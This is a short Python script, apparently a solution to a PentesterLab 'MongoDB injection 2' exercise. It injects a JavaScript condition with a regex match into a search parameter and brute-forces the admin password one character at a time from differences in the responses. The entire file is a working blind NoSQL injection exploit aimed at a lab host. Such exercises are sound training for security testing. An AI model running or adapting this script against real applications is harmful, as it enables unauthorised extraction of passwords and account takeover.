#pentesterlab MongoDB injection 2
import requests
import string

URL="http://ptl-66744244-644843ed.libcurl.so/?search="

def check(payload):
    url=URL+f"admin%27%26%26this.password.match(/^{payload}.*$/)%00"
    #print(url)
    req = requests.get(url)
    data = req.content
    #print(data)
    return ">admin<" in str(data)
charset=list("-"+string.ascii_lowercase+string.digits)
password=""

while True:
    for c in charset:
        payload=password+c
        print(f"Trying : {payload}")
        if check(payload):
            password+=c
            print(password)
            break
        elif c==charset[-1]:
            print(f"The Password is {password}")
            exit(0)